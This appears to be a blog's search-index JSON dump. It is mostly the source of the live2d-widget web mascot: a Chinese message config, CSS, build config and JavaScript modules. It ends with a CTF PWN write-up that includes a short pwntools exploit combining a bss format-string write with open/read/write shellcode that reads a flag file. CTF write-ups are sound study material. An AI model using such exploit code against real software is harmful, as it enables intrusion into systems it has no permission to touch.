a[rel='prev']\",\"text\":[\"来看看上一篇文章吧。\",\"点它可以看上一篇文章哦！\",\"要翻到上一篇文章吗？\"]},{\"selector\":\".extend.next\",\"text\":[\"去下一页看看吧。\",\"点它可以前进哦！\",\"要翻到下一页吗？\"]},{\"selector\":\".extend.prev\",\"text\":[\"去上一页看看吧。\",\"点它可以后退哦！\",\"要翻到上一页吗？\"]},{\"selector\":\"input.vnick\",\"text\":[\"该怎么称呼你呢？\",\"留下你的尊姓大名！\"]},{\"selector\":\".vmail\",\"text\":[\"留下你的邮箱，不然就是无头像人士了！\",\"记得设置好 Gravatar 头像哦！\",\"为了方便通知你最新消息，一定要留下邮箱！\"]},{\"selector\":\".vlink\",\"text\":[\"快快告诉我你的家在哪里，好让我去参观参观！\"]},{\"selector\":\".veditor\",\"text\":[\"想要去评论些什么吗？\",\"要说点什么吗？\",\"觉得博客不错？快来留言和主人交流吧！\"]},{\"selector\":\".vcontrol a\",\"text\":[\"你会不会熟练使用 Markdown 呀？\",\"使用 Markdown 让评论更美观吧～\"]},{\"selector\":\".vemoji-btn\",\"text\":[\"要插入一个萌萌哒的表情吗？\",\"要来一发表情吗？\"]},{\"selector\":\".vpreview-btn\",\"text\":[\"要预览一下你的发言吗？\",\"快看看你的评论有多少负熵！\"]},{\"selector\":\".vsubmit\",\"text\":[\"评论没有审核，要对自己的发言负责哦～\",\"要提交了吗，请耐心等待回复哦～\"]},{\"selector\":\".vcontent\",\"text\":[\"哇，快看看这个精彩评论！\",\"如果有疑问，请尽快留言哦～\"]}],\"click\":[{\"selector\":\"#live2d\",\"text\":[\"是…是不小心碰到了吧…\",\"萝莉控是什么呀？\",\"你看到我的小熊了吗？\",\"再摸的话我可要报警了！⌇●﹏●⌇\",\"110 吗，这里有个变态一直在摸我(ó﹏ò｡)\",\"不要摸我了，我会告诉老婆来打你的！\",\"干嘛动我呀！小心我咬你！\",\"别摸我，有什么好摸的！\"]},{\"selector\":\".veditor\",\"text\":[\"要吐槽些什么呢？\",\"一定要认真填写喵～\",\"有什么想说的吗？\"]},{\"selector\":\".vsubmit\",\"text\":[\"输入验证码就可以提交评论啦～\"]}],\"seasons\":[{\"date\":\"01/01\",\"text\":\"元旦了呢，新的一年又开始了，今年是{year}年～\"},{\"date\":\"02/14\",\"text\":\"又是一年情人节，{year}年找到对象了嘛～\"},{\"date\":\"03/08\",\"text\":\"今天是国际妇女节！\"},{\"date\":\"03/12\",\"text\":\"今天是植树节，要保护环境呀！\"},{\"date\":\"04/01\",\"text\":\"悄悄告诉你一个秘密～今天是愚人节，不要被骗了哦～\"},{\"date\":\"05/01\",\"text\":\"今天是五一劳动节，计划好假期去哪里了吗～\"},{\"date\":\"06/01\",\"text\":\"儿童节了呢，快活的时光总是短暂，要是永远长不大该多好啊…\"},{\"date\":\"09/03\",\"text\":\"中国人民抗日战争胜利纪念日，铭记历史、缅怀先烈、珍爱和平、开创未来。\"},{\"date\":\"09/10\",\"text\":\"教师节，在学校要给老师问声好呀～\"},{\"date\":\"10/01\",\"text\":\"国庆节到了，为祖国母亲庆生！\"},{\"date\":\"11/05-11/12\",\"text\":\"今年的双十一是和谁一起过的呢～\"},{\"date\":\"12/20-12/31\",\"text\":\"这几天是圣诞节，主人肯定又去剁手买买买了～\"}],\"time\":[{\"hour\":\"6-7\",\"text\":\"早上好！一日之计在于晨，美好的一天就要开始了～\"},{\"hour\":\"8-11\",\"text\":\"上午好！工作顺利嘛，不要久坐，多起来走动走动哦！\"},{\"hour\":\"12-13\",\"text\":\"中午了，工作了一个上午，现在是午餐时间！\"},{\"hour\":\"14-17\",\"text\":\"午后很容易犯困呢，今天的运动目标完成了吗？\"},{\"hour\":\"18-19\",\"text\":\"傍晚了！窗外夕阳的景色很美丽呢，最美不过夕阳红～\"},{\"hour\":\"20-21\",\"text\":\"晚上好，今天过得怎么样？\"},{\"hour\":\"22-23\",\"text\":[\"已经这么晚了呀，早点休息吧，晚安～\",\"深夜时要爱护眼睛呀！\"]},{\"hour\":\"0-5\",\"text\":\"你是夜猫子呀？这么晚还不睡觉，明天起的来嘛？\"}],\"message\":{\"default\":[\"好久不见，日子过得好快呢……\",\"大坏蛋！你都多久没理人家了呀，嘤嘤嘤～\",\"嗨～快来逗我玩吧！\",\"拿小拳拳锤你胸口！\",\"记得把小家加入收藏夹哦！\"],\"console\":\"哈哈，你打开了控制台，是想要看看我的小秘密吗？\",\"copy\":\"你都复制了些什么呀，转载要记得加上出处哦！\",\"visibilitychange\":\"哇，你终于回来了～\"}}"},{"title":"","date":"2024-12-05T13:43:15.502Z","updated":"2024-12-05T13:43:11.108Z","comments":false,"path":"live2d-widget-master/package.json","permalink":"https://12yhy3.github.io/live2d-widget-master/package.json","excerpt":"","text":"{\"name\":\"live2d-widget\",\"version\":\"0.9.0\",\"description\":\"Live2D widget for web pages\",\"main\":\"autoload.js\",\"type\":\"module\",\"scripts\":{\"build\":\"rollup -c rollup.config.js -f iife | terser -c -m > waifu-tips.js\",\"build-dev\":\"rollup -c rollup.config.js -f iife -o waifu-tips.js -w\"},\"repository\":{\"type\":\"git\",\"url\":\"git+https://github.com/stevenjoezhang/live2d-widget.git\"},\"keywords\":[\"Live2d\"],\"author\":\"stevenjoezhang \",\"license\":\"GPL-3.0-or-later\",\"bugs\":{\"url\":\"https://github.com/stevenjoezhang/live2d-widget/issues\"},\"homepage\":\"https://github.com/stevenjoezhang/live2d-widget#readme\",\"devDependencies\":{\"@fortawesome/fontawesome-free\":\"^6.2.0\",\"@rollup/plugin-node-resolve\":\"^15.0.0\",\"@rollup/pluginutils\":\"^5.0.1\",\"rollup\":\"^3.2.3\",\"terser\":\"^5.15.1\"}}"},{"title":"","date":"2024-12-05T13:43:15.510Z","updated":"2024-12-05T13:43:11.191Z","comments":false,"path":"live2d-widget-master/waifu.css","permalink":"https://12yhy3.github.io/live2d-widget-master/waifu.css","excerpt":"","text":"#waifu-toggle { background-color: #fa0; border-radius: 5px; bottom: 66px; color: #fff; cursor: pointer; font-size: 12px; left: 0; margin-left: -100px; padding: 5px 2px 5px 5px; position: fixed; transition: margin-left 1s; width: 60px; writing-mode: vertical-rl; } #waifu-toggle.waifu-toggle-active { margin-left: -50px; } #waifu-toggle.waifu-toggle-active:hover { margin-left: -30px; } #waifu { bottom: -1000px; left: 0; line-height: 0; margin-bottom: -10px; position: fixed; transform: translateY(3px); transition: transform .3s ease-in-out, bottom 3s ease-in-out; z-index: 1; } #waifu:hover { transform: translateY(0); } #waifu-tips { animation: shake 50s ease-in-out 5s infinite; background-color: rgba(236, 217, 188, .5); border: 1px solid rgba(224, 186, 140, .62); border-radius: 12px; box-shadow: 0 3px 15px 2px rgba(191, 158, 118, .2); font-size: 14px; line-height: 24px; margin: -30px 20px; min-height: 70px; opacity: 0; overflow: hidden; padding: 5px 10px; position: absolute; text-overflow: ellipsis; transition: opacity 1s; width: 250px; word-break: break-all; } #waifu-tips.waifu-tips-active { opacity: 1; transition: opacity .2s; } #waifu-tips span { color: #0099cc; } #live2d { cursor: grab; height: 300px; position: relative; width: 300px; } #live2d:active { cursor: grabbing; } #waifu-tool { color: #aaa; opacity: 0; position: absolute; right: -10px; top: 70px; transition: opacity 1s; } #waifu:hover #waifu-tool { opacity: 1; } #waifu-tool span { display: block; height: 30px; text-align: center; } #waifu-tool svg { fill: #7b8c9d; cursor: pointer; height: 25px; transition: fill .3s; } #waifu-tool svg:hover { fill: #0684bd; /* #34495e */ } @keyframes shake { 2% { transform: translate(.5px, -1.5px) rotate(-.5deg); } 4% { transform: translate(.5px, 1.5px) rotate(1.5deg); } 6% { transform: translate(1.5px, 1.5px) rotate(1.5deg); } 8% { transform: translate(2.5px, 1.5px) rotate(.5deg); } 10% { transform: translate(.5px, 2.5px) rotate(.5deg); } 12% { transform: translate(1.5px, 1.5px) rotate(.5deg); } 14% { transform: translate(.5px, .5px) rotate(.5deg); } 16% { transform: translate(-1.5px, -.5px) rotate(1.5deg); } 18% { transform: translate(.5px, .5px) rotate(1.5deg); } 20% { transform: translate(2.5px, 2.5px) rotate(1.5deg); } 22% { transform: translate(.5px, -1.5px) rotate(1.5deg); } 24% { transform: translate(-1.5px, 1.5px) rotate(-.5deg); } 26% { transform: translate(1.5px, .5px) rotate(1.5deg); } 28% { transform: translate(-.5px, -.5px) rotate(-.5deg); } 30% { transform: translate(1.5px, -.5px) rotate(-.5deg); } 32% { transform: translate(2.5px, -1.5px) rotate(1.5deg); } 34% { transform: translate(2.5px, 2.5px) rotate(-.5deg); } 36% { transform: translate(.5px, -1.5px) rotate(.5deg); } 38% { transform: translate(2.5px, -.5px) rotate(-.5deg); } 40% { transform: translate(-.5px, 2.5px) rotate(.5deg); } 42% { transform: translate(-1.5px, 2.5px) rotate(.5deg); } 44% { transform: translate(-1.5px, 1.5px) rotate(.5deg); } 46% { transform: translate(1.5px, -.5px) rotate(-.5deg); } 48% { transform: translate(2.5px, -.5px) rotate(.5deg); } 50% { transform: translate(-1.5px, 1.5px) rotate(.5deg); } 52% { transform: translate(-.5px, 1.5px) rotate(.5deg); } 54% { transform: translate(-1.5px, 1.5px) rotate(.5deg); } 56% { transform: translate(.5px, 2.5px) rotate(1.5deg); } 58% { transform: translate(2.5px, 2.5px) rotate(.5deg); } 60% { transform: translate(2.5px, -1.5px) rotate(1.5deg); } 62% { transform: translate(-1.5px, .5px) rotate(1.5deg); } 64% { transform: translate(-1.5px, 1.5px) rotate(1.5deg); } 66% { transform: translate(.5px, 2.5px) rotate(1.5deg); } 68% { transform: translate(2.5px, -1.5px) rotate(1.5deg); } 70% { transform: translate(2.5px, 2.5px) rotate(.5deg); } 72% { transform: translate(-.5px, -1.5px) rotate(1.5deg); } 74% { transform: translate(-1.5px, 2.5px) rotate(1.5deg); } 76% { transform: translate(-1.5px, 2.5px) rotate(1.5deg); } 78% { transform: translate(-1.5px, 2.5px) rotate(.5deg); } 80% { transform: translate(-1.5px, .5px) rotate(-.5deg); } 82% { transform: translate(-1.5px, .5px) rotate(-.5deg); } 84% { transform: translate(-.5px, .5px) rotate(1.5deg); } 86% { transform: translate(2.5px, 1.5px) rotate(.5deg); } 88% { transform: translate(-1.5px, .5px) rotate(1.5deg); } 90% { transform: translate(-1.5px, -.5px) rotate(-.5deg); } 92% { transform: translate(-1.5px, -1.5px) rotate(1.5deg); } 94% { transform: translate(.5px, .5px) rotate(-.5deg); } 96% { transform: translate(2.5px, -.5px) rotate(-.5deg); } 98% { transform: translate(-1.5px, -1.5px) rotate(-.5deg); } 0%, 100% { transform: translate(0, 0) rotate(0); } }"},{"title":"","date":"2024-12-05T13:43:15.506Z","updated":"2024-12-05T13:43:11.134Z","comments":false,"path":"live2d-widget-master/rollup.config.js","permalink":"https://12yhy3.github.io/live2d-widget-master/rollup.config.js","excerpt":"","text":"import { nodeResolve } from \"@rollup/plugin-node-resolve\"; import { createFilter } from \"@rollup/pluginutils\"; function string(opts = {}) { if (!opts.include) { throw Error(\"include option should be specified\"); } const filter = createFilter(opts.include, opts.exclude); return { name: \"string\", transform(code, id) { if (filter(id)) { return { code: `export default ${JSON.stringify(code)};`, map: { mappings: \"\" } }; } }, renderChunk(code, chunk, outputOptions = {}) { return `/*! * Live2D Widget * https://github.com/stevenjoezhang/live2d-widget */ ` + code; } }; } export default { input: \"src/waifu-tips.js\", plugins: [nodeResolve(), string({ include: \"**/*.svg\", })] };"},{"title":"","date":"2024-12-05T13:43:11.305Z","updated":"2024-12-05T13:43:11.305Z","comments":false,"path":"live2d-widget-master/demo/login.html","permalink":"https://12yhy3.github.io/live2d-widget-master/demo/login.html","excerpt":"","text":"看板娘登陆平台 html, body { height: 100%; } body { display: flex; align-items: center; justify-content: center; padding-top: 40px; padding-bottom: 40px; background-color: #f5f5f5; } .form-signin { width: 100%; max-width: 330px; padding: 15px; margin: 0 auto; } .form-signin .checkbox { font-weight: 400; } .form-signin .form-control { position: relative; box-sizing: border-box; height: auto; padding: 10px; font-size: 16px; } .form-signin .form-control:focus { z-index: 2; } .form-signin input[type=text] { margin-bottom: -1px; border-bottom-right-radius: 0; border-bottom-left-radius: 0; } .form-signin input[type=password] { margin-bottom: 10px; border-top-left-radius: 0; border-top-right-radius: 0; } #stage { position: relative; } #stage img { width: 100%; margin-bottom: 20px; border-radius: 20px; } #stage button { position: absolute; padding: 0; } #inner { position: relative; background-color: #999; clip-path: circle(120px at center); } #cover { position: absolute; background-color: #CB3837; width: 100%; height: 100%; bottom: 10%; transition: all 1s; box-shadow: 0 0 0 5px rgba(0, 0, 0, .1); } #text { position: absolute; bottom: 30%; font-size: 2em; left: 50%; transform: translateX(-50%); opacity: 0.4; font-weight: bold; } #detail { position: absolute; background: rgba(255, 255, 255, .1); width: 100%; height: 10px; bottom: 0; } #handle { position: absolute; background: #ccc; bottom: -2px; box-shadow: 0 1px 0 1px rgba(0, 0, 0, .1); height: 8px; left: 50%; margin-left: -15px; width: 30px; cursor: pointer; } #info { left: 40px; bottom: 20px; } #refresh { right: 40px; bottom: 20px; } #live2d { cursor: grab; height: 300px; width: 300px; } #live2d:active { cursor: grabbing; } MIMIPOWERED 看板娘登陆平台 用户名 密码 记住我 登录 Copyleft &copy; Mimi 2019 /* * _(:з」∠)_ * Created by Shuqiao Zhang in 2019. * https://zhangshuqiao.org */ /* * This program is free software: you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation, either version 3 of the License, or * (at your option) any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the * GNU General Public License for more details. */ window.addEventListener(\"load\", () => { \"use strict\"; if (!CSS.supports(\"clip-path\", \"circle(120px at center)\")) { document.getElementById(\"stage\").innerHTML = ''; return; } const apiPath = \"https://live2d.fghrsh.net/api\"; let state = 0, loading = false, modelId = localStorage.getItem(\"modelId\"), modelTexturesId = localStorage.getItem(\"modelTexturesId\"); if (modelId === null) { modelId = 1; modelTexturesId = 53; } loadModel(modelId, modelTexturesId); function loadModel(modelId, modelTexturesId) { localStorage.setItem(\"modelId\", modelId); if (modelTexturesId === undefined) modelTexturesId = 0; localStorage.setItem(\"modelTexturesId\", modelTexturesId); loadlive2d(\"live2d\", `${apiPath}/get/?id=${modelId}-${modelTexturesId}`, null); console.log(\"live2d\", `模型 ${modelId}-${modelTexturesId} 加载完成`); setTimeout(() => { coverPosition(\"80%\"); state = 2; }, 2000); } function loadRandModel() { const modelId = localStorage.getItem(\"modelId\"), modelTexturesId = localStorage.getItem(\"modelTexturesId\"); fetch(`${apiPath}/rand_textures/?id=${modelId}-${modelTexturesId}`) .then(response => response.json()) .then(result => { loadModel(modelId, result.textures.id); setTimeout(() => { state = 2; coverPosition(\"80%\"); loading = false; }, 1000); }); } function coverPosition(pos) { document.getElementById(\"cover\").style.bottom = pos; } document.getElementById(\"info\").addEventListener(\"click\", () => { fetch(\"https://v1.hitokoto.cn\") .then(response => response.json()) .then(result => { alert(\"「\" + result.hitokoto + \"」——\" + result.from); }); }); document.getElementById(\"refresh\").addEventListener(\"click\", () => { if (loading) return; state = 0; coverPosition(\"10%\"); loading = true; setTimeout(loadRandModel, 1000); }); document.getElementById(\"handle\").addEventListener(\"click\", () => { if (state === 1) { state = 2; coverPosition(\"80%\"); } else if (state === 2) { state = 1; coverPosition(\"20%\"); } }); document.querySelector(\"input[type=password]\").addEventListener(\"focus\", () => { if (state === 2) { state = 1; coverPosition(\"20%\"); } }); document.querySelector(\"input[type=password]\").addEventListener(\"blur\", () => { if (state === 1) { state = 2; coverPosition(\"80%\"); } }); });"},{"title":"","date":"2024-12-05T13:43:11.284Z","updated":"2024-12-05T13:43:11.284Z","comments":false,"path":"live2d-widget-master/demo/demo.html","permalink":"https://12yhy3.github.io/live2d-widget-master/demo/demo.html","excerpt":"","text":"Live2D 看板娘 / Demo #github svg { transition: all 1s; fill: #222; color: #fff; position: absolute; top: 0; right: 0; border: 0; width: 80px; height: 80px; } #github:hover svg { width: 160px; height: 160px; }"},{"title":"","date":"2024-12-05T13:43:15.500Z","updated":"2024-12-05T13:43:11.090Z","comments":false,"path":"live2d-widget-master/live2d.min.js","permalink":"https://12yhy3.github.io/live2d-widget-master/live2d.min.js","excerpt":"","text":"!function(t){function i(r){if(e[r])return e[r].exports;var o=e[r]={i:r,l:!1,exports:{}};return t[r].call(o.exports,o,o.exports,i),o.l=!0,o.exports}var e={};i.m=t,i.c=e,i.d=function(t,e,r){i.o(t,e)||Object.defineProperty(t,e,{configurable:!1,enumerable:!0,get:r})},i.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return i.d(e,\"a\",e),e},i.o=function(t,i){return Object.prototype.hasOwnProperty.call(t,i)},i.p=\"\",i(i.s=4)}([function(t,i,e){\"use strict\";function r(){this.live2DModel=null,this.modelMatrix=null,this.eyeBlink=null,this.physics=null,this.pose=null,this.debugMode=!1,this.initialized=!1,this.updating=!1,this.alpha=1,this.accAlpha=0,this.lipSync=!1,this.lipSyncValue=0,this.accelX=0,this.accelY=0,this.accelZ=0,this.dragX=0,this.dragY=0,this.startTimeMSec=null,this.mainMotionManager=new h,this.expressionManager=new h,this.motions={},this.expressions={},this.isTexLoaded=!1}function o(){AMotion.prototype.constructor.call(this),this.paramList=new Array}function n(){this.id=\"\",this.type=-1,this.value=null}function s(){this.nextBlinkTime=null,this.stateStartTime=null,this.blinkIntervalMsec=null,this.eyeState=g.STATE_FIRST,this.blinkIntervalMsec=4e3,this.closingMotionMsec=100,this.closedMotionMsec=50,this.openingMotionMsec=150,this.closeIfZero=!0,this.eyeID_L=\"PARAM_EYE_L_OPEN\",this.eyeID_R=\"PARAM_EYE_R_OPEN\"}function _(){this.tr=new Float32Array(16),this.identity()}function a(t,i){_.prototype.constructor.call(this),this.width=t,this.height=i}function h(){MotionQueueManager.prototype.constructor.call(this),this.currentPriority=null,this.reservePriority=null,this.super=MotionQueueManager.prototype}function l(){this.physicsList=new Array,this.startTimeMSec=UtSystem.getUserTimeMSec()}function $(){this.lastTime=0,this.lastModel=null,this.partsGroups=new Array}function u(t){this.paramIndex=-1,this.partsIndex=-1,this.link=null,this.id=t}function p(){this.EPSILON=.01,this.faceTargetX=0,this.faceTargetY=0,this.faceX=0,this.faceY=0,this.faceVX=0,this.faceVY=0,this.lastTimeSec=0}function f(){_.prototype.constructor.call(this),this.screenLeft=null,this.screenRight=null,this.screenTop=null,this.screenBottom=null,this.maxLeft=null,this.maxRight=null,this.maxTop=null,this.maxBottom=null,this.max=Number.MAX_VALUE,this.min=0}function c(){}var d=0;r.prototype.getModelMatrix=function(){return this.modelMatrix},r.prototype.setAlpha=function(t){t>.999&&(t=1),t"},{"title":"","date":"2024-12-05T13:43:11.343Z","updated":"2024-12-05T13:43:11.343Z","comments":false,"path":"live2d-widget-master/src/message.js","permalink":"https://12yhy3.github.io/live2d-widget-master/src/message.js","excerpt":"","text":"import randomSelection from \"./utils.js\"; let messageTimer; function showMessage(text, timeout, priority) { if (!text || (sessionStorage.getItem(\"waifu-text\") && sessionStorage.getItem(\"waifu-text\") > priority)) return; if (messageTimer) { clearTimeout(messageTimer); messageTimer = null; } text = randomSelection(text); sessionStorage.setItem(\"waifu-text\", priority); const tips = document.getElementById(\"waifu-tips\"); tips.innerHTML = text; tips.classList.add(\"waifu-tips-active\"); messageTimer = setTimeout(() => { sessionStorage.removeItem(\"waifu-text\"); tips.classList.remove(\"waifu-tips-active\"); }, timeout); } export default showMessage;"},{"title":"","date":"2024-12-05T13:43:11.327Z","updated":"2024-12-05T13:43:11.327Z","comments":false,"path":"live2d-widget-master/src/index.js","permalink":"https://12yhy3.github.io/live2d-widget-master/src/index.js","excerpt":"","text":"import Model from \"./model.js\"; import showMessage from \"./message.js\"; import randomSelection from \"./utils.js\"; import tools from \"./tools.js\"; function loadWidget(config) { const model = new Model(config); localStorage.removeItem(\"waifu-display\"); sessionStorage.removeItem(\"waifu-text\"); document.body.insertAdjacentHTML(\"beforeend\", ` `); // https://stackoverflow.com/questions/24148403/trigger-css-transition-on-appended-element setTimeout(() => { document.getElementById(\"waifu\").style.bottom = 0; }, 0); (function registerTools() { tools[\"switch-model\"].callback = () => model.loadOtherModel(); tools[\"switch-texture\"].callback = () => model.loadRandModel(); if (!Array.isArray(config.tools)) { config.tools = Object.keys(tools); } for (let tool of config.tools) { if (tools[tool]) { const { icon, callback } = tools[tool]; document.getElementById(\"waifu-tool\").insertAdjacentHTML(\"beforeend\", `${icon}`); document.getElementById(`waifu-tool-${tool}`).addEventListener(\"click\", callback); } } })(); function welcomeMessage(time) { if (location.pathname === \"/\") { // 如果是主页 for (let { hour, text } of time) { const now = new Date(), after = hour.split(\"-\")[0], before = hour.split(\"-\")[1] || after; if (after userAction = true); setInterval(() => { if (userAction) { userAction = false; clearInterval(userActionTimer); userActionTimer = null; } else if (!userActionTimer) { userActionTimer = setInterval(() => { showMessage(messageArray, 6000, 9); }, 20000); } }, 1000); showMessage(welcomeMessage(result.time), 7000, 11); window.addEventListener(\"mouseover\", event => { for (let { selector, text } of result.mouseover) { if (!event.target.closest(selector)) continue; if (lastHoverElement === selector) return; lastHoverElement = selector; text = randomSelection(text); text = text.replace(\"{text}\", event.target.innerText); showMessage(text, 4000, 8); return; } }); window.addEventListener(\"click\", event => { for (let { selector, text } of result.click) { if (!event.target.closest(selector)) continue; text = randomSelection(text); text = text.replace(\"{text}\", event.target.innerText); showMessage(text, 4000, 8); return; } }); result.seasons.forEach(({ date, text }) => { const now = new Date(), after = date.split(\"-\")[0], before = date.split(\"-\")[1] || after; if ((after.split(\"/\")[0] { if (!document.hidden) showMessage(result.message.visibilitychange, 6000, 9); }); } (function initModel() { let modelId = localStorage.getItem(\"modelId\"), modelTexturesId = localStorage.getItem(\"modelTexturesId\"); if (modelId === null) { // 首次访问加载 指定模型 的 指定材质 modelId = 1; // 模型 ID modelTexturesId = 53; // 材质 ID } model.loadModel(modelId, modelTexturesId); fetch(config.waifuPath) .then(response => response.json()) .then(registerEventListener); })(); } function initWidget(config, apiPath) { if (typeof config === \"string\") { config = { waifuPath: config, apiPath }; } document.body.insertAdjacentHTML(\"beforeend\", ` 看板娘 `); const toggle = document.getElementById(\"waifu-toggle\"); toggle.addEventListener(\"click\", () => { toggle.classList.remove(\"waifu-toggle-active\"); if (toggle.getAttribute(\"first-time\")) { loadWidget(config); toggle.removeAttribute(\"first-time\"); } else { localStorage.removeItem(\"waifu-display\"); document.getElementById(\"waifu\").style.display = \"\"; setTimeout(() => { document.getElementById(\"waifu\").style.bottom = 0; }, 0); } }); if (localStorage.getItem(\"waifu-display\") && Date.now() - localStorage.getItem(\"waifu-display\") { toggle.classList.add(\"waifu-toggle-active\"); }, 0); } else { loadWidget(config); } } export default initWidget;"},{"title":"","date":"2024-12-05T13:43:11.359Z","updated":"2024-12-05T13:43:11.359Z","comments":false,"path":"live2d-widget-master/src/model.js","permalink":"https://12yhy3.github.io/live2d-widget-master/src/model.js","excerpt":"","text":"import showMessage from \"./message.js\"; import randomSelection from \"./utils.js\"; class Model { constructor(config) { let { apiPath, cdnPath } = config; let useCDN = false; if (typeof cdnPath === \"string\") { useCDN = true; if (!cdnPath.endsWith(\"/\")) cdnPath += \"/\"; } else if (typeof apiPath === \"string\") { if (!apiPath.endsWith(\"/\")) apiPath += \"/\"; } else { throw \"Invalid initWidget argument!\"; } this.useCDN = useCDN; this.apiPath = apiPath; this.cdnPath = cdnPath; } async loadModelList() { const response = await fetch(`${this.cdnPath}model_list.json`); this.modelList = await response.json(); } async loadModel(modelId, modelTexturesId, message) { localStorage.setItem(\"modelId\", modelId); localStorage.setItem(\"modelTexturesId\", modelTexturesId); showMessage(message, 4000, 10); if (this.useCDN) { if (!this.modelList) await this.loadModelList(); const target = randomSelection(this.modelList.models[modelId]); loadlive2d(\"live2d\", `${this.cdnPath}model/${target}/index.json`); } else { loadlive2d(\"live2d\", `${this.apiPath}get/?id=${modelId}-${modelTexturesId}`); console.log(`Live2D 模型 ${modelId}-${modelTexturesId} 加载完成`); } } async loadRandModel() { const modelId = localStorage.getItem(\"modelId\"), modelTexturesId = localStorage.getItem(\"modelTexturesId\"); if (this.useCDN) { if (!this.modelList) await this.loadModelList(); const target = randomSelection(this.modelList.models[modelId]); loadlive2d(\"live2d\", `${this.cdnPath}model/${target}/index.json`); showMessage(\"我的新衣服好看嘛？\", 4000, 10); } else { // 可选 \"rand\"(随机), \"switch\"(顺序) fetch(`${this.apiPath}rand_textures/?id=${modelId}-${modelTexturesId}`) .then(response => response.json()) .then(result => { if (result.textures.id === 1 && (modelTexturesId === 1 || modelTexturesId === 0)) showMessage(\"我还没有其他衣服呢！\", 4000, 10); else this.loadModel(modelId, result.textures.id, \"我的新衣服好看嘛？\"); }); } } async loadOtherModel() { let modelId = localStorage.getItem(\"modelId\"); if (this.useCDN) { if (!this.modelList) await this.loadModelList(); const index = (++modelId >= this.modelList.models.length) ? 0 : modelId; this.loadModel(index, 0, this.modelList.messages[index]); } else { fetch(`${this.apiPath}switch/?id=${modelId}`) .then(response => response.json()) .then(result => { this.loadModel(result.model.id, 0, result.model.message); }); } } } export default Model;"},{"title":"","date":"2024-12-05T13:43:11.390Z","updated":"2024-12-05T13:43:11.390Z","comments":false,"path":"live2d-widget-master/src/utils.js","permalink":"https://12yhy3.github.io/live2d-widget-master/src/utils.js","excerpt":"","text":"function randomSelection(obj) { return Array.isArray(obj) ? obj[Math.floor(Math.random() * obj.length)] : obj; } export default randomSelection;"},{"title":"","date":"2024-12-05T13:43:11.406Z","updated":"2024-12-05T13:43:11.406Z","comments":false,"path":"live2d-widget-master/src/waifu-tips.js","permalink":"https://12yhy3.github.io/live2d-widget-master/src/waifu-tips.js","excerpt":"","text":"import initWidget from \"./index.js\"; window.initWidget = initWidget;"},{"title":"","date":"2024-12-05T13:43:11.375Z","updated":"2024-12-05T13:43:11.375Z","comments":false,"path":"live2d-widget-master/src/tools.js","permalink":"https://12yhy3.github.io/live2d-widget-master/src/tools.js","excerpt":"","text":"import fa_comment from \"@fortawesome/fontawesome-free/svgs/solid/comment.svg\"; import fa_paper_plane from \"@fortawesome/fontawesome-free/svgs/solid/paper-plane.svg\"; import fa_user_circle from \"@fortawesome/fontawesome-free/svgs/solid/circle-user.svg\"; import fa_street_view from \"@fortawesome/fontawesome-free/svgs/solid/street-view.svg\"; import fa_camera_retro from \"@fortawesome/fontawesome-free/svgs/solid/camera-retro.svg\"; import fa_info_circle from \"@fortawesome/fontawesome-free/svgs/solid/circle-info.svg\"; import fa_xmark from \"@fortawesome/fontawesome-free/svgs/solid/xmark.svg\"; import showMessage from \"./message.js\"; function showHitokoto() { // 增加 hitokoto.cn 的 API fetch(\"https://v1.hitokoto.cn\") .then(response => response.json()) .then(result => { const text = `这句一言来自 「${result.from}」，是 ${result.creator} 在 hitokoto.cn 投稿的。`; showMessage(result.hitokoto, 6000, 9); setTimeout(() => { showMessage(text, 4000, 9); }, 6000); }); } const tools = { \"hitokoto\": { icon: fa_comment, callback: showHitokoto }, \"asteroids\": { icon: fa_paper_plane, callback: () => { if (window.Asteroids) { if (!window.ASTEROIDSPLAYERS) window.ASTEROIDSPLAYERS = []; window.ASTEROIDSPLAYERS.push(new Asteroids()); } else { const script = document.createElement(\"script\"); script.src = \"https://fastly.jsdelivr.net/gh/stevenjoezhang/asteroids/asteroids.js\"; document.head.appendChild(script); } } }, \"switch-model\": { icon: fa_user_circle, callback: () => {} }, \"switch-texture\": { icon: fa_street_view, callback: () => {} }, \"photo\": { icon: fa_camera_retro, callback: () => { showMessage(\"照好了嘛，是不是很可爱呢？\", 6000, 9); Live2D.captureName = \"photo.png\"; Live2D.captureFrame = true; } }, \"info\": { icon: fa_info_circle, callback: () => { open(\"https://github.com/stevenjoezhang/live2d-widget\"); } }, \"quit\": { icon: fa_xmark, callback: () => { localStorage.setItem(\"waifu-display\", Date.now()); showMessage(\"愿你有一天能与重要的人重逢。\", 2000, 11); document.getElementById(\"waifu\").style.bottom = \"-500px\"; setTimeout(() => { document.getElementById(\"waifu\").style.display = \"none\"; document.getElementById(\"waifu-toggle\").classList.add(\"waifu-toggle-active\"); }, 3000); } } }; export default tools;"}],"posts":[{"title":"金盾信安杯_PWN","slug":"2024-jdxa","date":"2024-12-02T00:42:00.000Z","updated":"2024-12-02T11:14:43.043Z","comments":true,"path":"2024/12/02/2024-jdxa/","permalink":"https://12yhy3.github.io/2024/12/02/2024-jdxa/","excerpt":"","text":"20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改exit() 执行时的 dlfiini 源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。 分析思路：在bss段布置shellcode，劫持程序执行流转到输入地址。 具体：在bss段布置来实现执行shellcode（orw）的跳板，之后修改dl_fini的rsi偏移来指向orw执行的地址即可，后续程序执行到 exit() 退出时候会读出flag。 exp1234567891011121314151617from pwn import *elf = ELF(&#x27;./pwn&#x27;)context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)r=process(&#x27;./pwn&#x27;)s= shellcraft.open(&quot;./flag&quot;,0)s+= shellcraft.read(1,0x4040b0 + 0x100,0x100)s+= shellcraft.write(2,0x4040b0 + 0x100,0x100)#------------------------不懂-----------------------------p = b&quot;%776c%30$hn&quot; # 776 = 0x308p = p.ljust(0x40,b&#x27;\\x00&#x27;)p += p64(0x4040b8)p += b&quot;\\x90&quot;*0x10#-----------------------------------------------------p += asm(s)print(len(p))r.sendafter(b&quot;Let&#x27;s start!\\n&quot;,p)r.interactive() 2024⭐orange 考点： house of orange &amp;&amp; FSOP 注意点：libc_2.23 